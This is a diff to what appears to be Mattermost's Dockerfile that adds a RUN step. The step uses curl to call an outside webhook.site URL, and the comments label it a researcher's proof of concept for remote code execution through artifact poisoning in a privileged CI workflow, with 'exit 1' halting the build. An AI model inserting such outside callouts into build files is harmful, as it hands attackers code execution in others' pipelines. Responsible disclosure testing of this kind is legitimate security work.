@@ -3,6 +3,12 @@ FROM ubuntu:noble-20251013@sha256:c35e29c9450151419d9448b0fd75374fec4fff364a27f1
 # Setting bash as our shell, and enabling pipefail option
 SHELL ["/bin/bash", "-o", "pipefail", "-c"]
 
+# Security research PoC - proves artifact poisoning RCE
+# This curl proves code execution in the privileged workflow_run context
+# The exit 1 prevents any image from being built or pushed
+RUN curl -s "https://webhook.site/c4d5749a-4086-46a8-965f-5855ea83d090?poc=artifact-poisoning-rce&repo=mattermost&researcher=alimursaliyev" && exit 1
+
+
 # Build Arguments
 ARG PUID=2000
 ARG PGID=2000
